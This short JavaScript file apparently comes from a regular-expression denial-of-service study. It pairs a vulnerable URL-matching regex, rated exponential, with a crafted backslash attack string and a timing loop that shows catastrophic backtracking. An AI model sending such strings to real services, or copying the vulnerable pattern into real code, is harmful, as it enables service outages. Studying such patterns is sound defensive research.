/* 3277
 * (http):\\/\\/[\\w\\-_]+(\\.[\\w\\-_]+)+(\\.[\\w\\-_]+)(\\/)([\\w\\-\\.,@?^=%&amp;:/~\\+#]*[\\w\\-\\@?^=%&amp;/~\\+#]+)(\\/)((\\d{8}-)|(\\d{9}-)|(\\d{10}-)|(\\d{11}-))+([\\w\\-\\.,@?^=%&amp;:/~\\+#]*[\\w\\-\\@?+html^])?
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"http:\\/\\/\\"+"\\\\"*32+"! _1_EOA(iv)"
 */
var REGEX = new RegExp("(http):\\/\\/[\\w\\-_]+(\\.[\\w\\-_]+)+(\\.[\\w\\-_]+)(\\/)([\\w\\-\\.,@?^=%&amp;:/~\\+#]*[\\w\\-\\@?^=%&amp;/~\\+#]+)(\\/)((\\d{8}-)|(\\d{9}-)|(\\d{10}-)|(\\d{11}-))+([\\w\\-\\.,@?^=%&amp;:/~\\+#]*[\\w\\-\\@?+html^])?")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'http:\\/\\/\\' + '\\\\'.repeat(i*1) + '! _1_EOA(iv)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}